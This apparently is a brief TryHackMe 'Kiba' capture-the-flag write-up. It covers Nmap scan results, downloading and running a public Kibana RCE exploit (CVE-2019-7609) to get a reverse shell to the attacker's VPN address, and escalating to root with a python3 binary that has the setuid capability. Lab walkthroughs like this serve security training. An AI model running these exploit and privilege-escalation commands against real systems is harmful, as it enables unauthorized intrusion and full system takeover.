# Kiba
tryhackme.com/room/kiba

#### Nmap

    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    | 2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
    |   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
    |_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

and we got another port thats 5601 kibana 

searching google for kibana rce exploit and got this one 
https://github.com/mpgn/CVE-2019-7609

    wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/master/CVE-2019-7609-kibana-rce.py

then run this

    pyhton CVE-2019-7609-kibana-rce.py -u http://10.10.188.47:5601 -host <your vpn> -port 1234 --shell

kabooom we got reverse shell.....

    cat /home/kiba/user.txt

thennnn go for privesc using Capabilities 

what is Capabilities 

Linux divides these privileges into distinct units, known as capabilities. These capabilities can be added to an executable, which will give any user running that executable the specific superuser privilege defined by the capability

ls -la in kiba we have got dir like .hackmeplease then cd to the dir we got python3 ahhh this is executable to capabilities

then searching into google like 

Exploiting capability using python3

Assuming an intruder has compromised the host machine as local user and spawn the least privilege shell and he looked for system capabilities and found empty capability (ep) over suid is given python3 for user demo that means all privilege is assigned to user for that program, therefore taking advantage of this permission he can escalate into high privilege from low privilege shell.

    getcap -r / 2>/dev/null
    cd .hackmeplease
    ls -al python3
    ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    id
    cat /root/root.txt

Booomm root.....

